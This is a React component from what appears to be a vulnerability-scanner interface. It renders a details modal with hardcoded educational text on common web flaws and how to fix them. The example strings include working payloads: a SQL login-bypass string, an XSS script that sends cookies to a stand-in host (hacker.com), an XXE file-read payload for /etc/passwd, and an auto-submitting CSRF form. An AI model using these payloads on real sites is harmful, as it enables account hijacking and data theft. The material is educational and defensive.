import React from 'react';

/**
 * A modal-like component to display detailed information about a vulnerability.
 * @param {object} props The component props.
 * @param {object} props.vulnerability The vulnerability object to display.
 * @param {function} props.onClose The function to call to close the details view.
 * @returns {JSX.Element} The VulnerabilityDetails component.
 */
const VulnerabilityDetails = ({ vulnerability, onClose }) => {
  if (!vulnerability) return null;

  const getRiskColor = (risk) => {
    switch (risk.toLowerCase()) {
      case 'high':
        return 'text-red-500 bg-red-100';
      case 'medium':
        return 'text-orange-500 bg-orange-100';
      case 'low':
        return 'text-yellow-500 bg-yellow-100';
      default:
        return 'text-blue-500 bg-blue-100';
    }
  };

  const riskClasses = `font-bold px-3 py-1 rounded-full text-xs uppercase ${getRiskColor(vulnerability.risk)}`;
  
  // Example data for the full description
  // In a real application, this data would come from the backend.
  const details = {
    "SQL Injection": {
      exploit: "A hacker enters malicious SQL code into a web form (like a login or search bar). If the application doesn't properly handle the input, the hacker's code can be executed, leading to data theft or system takeover.",
      protect: "Use **prepared statements** or **parameterized queries** to separate user input from SQL code. Always validate and sanitize all user input before using it in a query.",
      example: "A hacker could input `admin'--` into a username field to bypass authentication. The `--` is a SQL comment, making the database ignore the rest of the query.",
      specificExample: "If an application is vulnerable, a hacker could use the following login credentials to bypass authentication: \nUsername: `admin' --`\nPassword: `any_password`",
    },
    "Cross-Site Scripting (XSS)": {
      exploit: "A hacker injects malicious JavaScript code into a vulnerable website. When other users visit the page, their browser executes the script, which can steal their session cookies, redirect them to a phishing page, or hijack their account.",
      protect: "**Sanitize and escape** all user input before displaying it. Use a **Content Security Policy (CSP)** to restrict which domains can execute scripts.",
      example: "A hacker could post a comment with a script tag like `<script>alert('You have been hacked!')</script>` to be executed by other users.",
      specificExample: "The following script, if left unsanitized, could be injected into a comment section to steal a user's session cookie:\n`<script>document.location='http://hacker.com/steal?cookie='+document.cookie;</script>`",
    },
    "Missing Security Headers": {
      exploit: "Without security headers like `X-Frame-Options`, a hacker can embed your website in a malicious page using an iframe, tricking users into clicking buttons or links. This is known as **clickjacking**.",
      protect: "Configure your web server to send crucial HTTP response headers like `X-Frame-Options: DENY` and `Strict-Transport-Security` to prevent a variety of browser-based attacks.",
      example: "A hacker creates a game or puzzle on their site, but secretly overlays an invisible iframe of your website, tricking users into giving permissions or clicking sensitive buttons.",
      specificExample: "An attacker could embed your site on their malicious domain using an iframe to perform a clickjacking attack. This can be prevented by adding the header `X-Frame-Options: SAMEORIGIN` to your site's responses.",
    },
    "Information Disclosure": {
      exploit: "A hacker can use detailed error messages (like `SyntaxError` with a full file path) to learn about your server's operating system, version numbers, and file structure. This information helps them find known vulnerabilities to exploit.",
      protect: "Configure your server to provide generic error messages and remove unnecessary headers like `Server` and `X-Powered-By`. This practice is called **security by obscurity**.",
      example: "The error `Server: Apache/2.4.41` tells a hacker exactly which version of the server software you're running, allowing them to search for known exploits for that version.",
      specificExample: "A `cURL` request could reveal sensitive server information in the headers:\n`Server: nginx/1.18.0 (Ubuntu)`\n`X-Powered-By: PHP/7.4.3`",
    },
    "Insecure Direct Object Reference (IDOR)": {
      exploit: "An attacker changes a parameter in the URL (e.g., `?id=123`) to access another user's data (e.g., `?id=124`) without authorization. The server doesn't check if the user has permission to view that data.",
      protect: "Always verify that the logged-in user has permission to access the requested data. Use proper authorization checks on every request.",
      example: "A user changes `mybank.com/account?id=456` to `mybank.com/account?id=789` and is granted access to another user's account details.",
      specificExample: "A hacker could access confidential user information by simply changing the ID in the URL, for example:\n`https://example.com/api/users/123` can be changed to `https://example.com/api/users/456`",
    },
    "Broken Authentication": {
      exploit: "Weak passwords or poor session management can allow attackers to gain access to user accounts. For example, a weak password policy like `123456` can be easily guessed or brute-forced.",
      protect: "Enforce a strong password policy (e.g., minimum length, use of special characters), implement multi-factor authentication (MFA), and use secure, randomly generated session IDs.",
      example: "An attacker uses a tool to try thousands of common passwords against a login page until they find one that works.",
      specificExample: "A weak login form could be vulnerable to a simple brute-force attack with a tool like `Hydra` to guess passwords from a list.",
    },
    "XML External Entities (XXE)": {
      exploit: "An attacker uploads an XML file that includes external entities, causing the server to process sensitive data or crash. The server may be tricked into requesting local files from the server's hard drive and exposing them.",
      protect: "Disable the processing of external entities in your XML parser. Use safe, standard libraries for XML parsing that are configured to prevent XXE attacks.",
      example: "An attacker sends a malicious XML document that causes the server to return the contents of its `/etc/passwd` file or other sensitive system files.",
      specificExample: "An attacker could send the following malicious XML payload to a vulnerable endpoint:\n`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><foo>&xxe;</foo>`",
    },
    "Cross-Site Request Forgery (CSRF)": {
      exploit: "An attacker tricks a user into submitting a malicious request to a website where they are already authenticated. For example, a hidden form on a malicious site might trick a logged-in user into making a bank transfer.",
      protect: "Use **CSRF tokens**. A unique, secret, and unpredictable value is embedded in forms and requests. The server checks that this token is valid for the current user's session, preventing forged requests.",
      example: "A logged-in user clicks a link on a malicious site, and a hidden form is submitted to their banking site, transferring money to the attacker's account.",
      specificExample: "A hacker could host the following hidden form on a malicious page to trick a user into changing their email:\n`<form action='https://example.com/change-email' method='POST' style='display:none;'><input type='hidden' name='new-email' value='hacker@mail.com' /></form><script>document.forms[0].submit();</script>`",
    },
    "Sensitive Data Exposure": {
      exploit: "Sensitive data (passwords, credit card numbers) is not properly encrypted or is stored in an easily accessible location. An attacker who gains access to the database or network traffic can simply read the data in plaintext.",
      protect: "Encrypt all sensitive data both in transit (using HTTPS/SSL) and at rest (in the database). Use modern cryptographic algorithms and follow industry best practices for data storage.",
      example: "A hacker intercepts a web request and finds a credit card number in the URL or in the request body because the site is not using HTTPS.",
      specificExample: "An attacker could inspect network traffic and find a user's password sent in plaintext if the site does not use HTTPS.",
    },
  };

  const vulnerabilityInfo = details[vulnerability.name] || {
    exploit: "Detailed information for this vulnerability is not available.",
    protect: "No specific protection methods are listed at this time.",
    example: "No specific example is available.",
    specificExample: "No specific example is available.",
  };

  return (
    <div className="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full flex items-center justify-center z-50" onClick={onClose}>
      <div className="bg-white rounded-xl shadow-2xl p-8 max-w-2xl w-full mx-4" onClick={e => e.stopPropagation()}>
        <div className="flex justify-between items-start border-b pb-4 mb-4">
          <div>
            <h3 className="text-3xl font-extrabold text-gray-900">{vulnerability.name}</h3>
            <p className="text-gray-600 mt-2">URL: <a href={vulnerability.url} className="text-blue-500 hover:underline">{vulnerability.url}</a></p>
            <span className={riskClasses}>{vulnerability.risk}</span>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition-colors">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>
        
        <div className="space-y-6">
          <div>
            <h4 className="text-lg font-bold text-gray-800">Vulnerability Description</h4>
            <p className="text-gray-700 mt-2">{vulnerability.description}</p>
          </div>
          <div>
            <h4 className="text-lg font-bold text-gray-800">How a Hacker Can Exploit It</h4>
            <p className="text-gray-700 mt-2">{vulnerabilityInfo.exploit}</p>
          </div>
          <div>
            <h4 className="text-lg font-bold text-gray-800">How to Protect and Fix It</h4>
            <p className="text-gray-700 mt-2">{vulnerabilityInfo.protect}</p>
          </div>
          <div>
            <h4 className="text-lg font-bold text-gray-800">Example</h4>
            <p className="text-gray-700 mt-2">{vulnerabilityInfo.example}</p>
          </div>
          <div>
            <h4 className="text-lg font-bold text-gray-800">Specific Example</h4>
            <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg mt-2 overflow-x-auto whitespace-pre-wrap">
              <code>{vulnerabilityInfo.specificExample}</code>
            </pre>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VulnerabilityDetails;
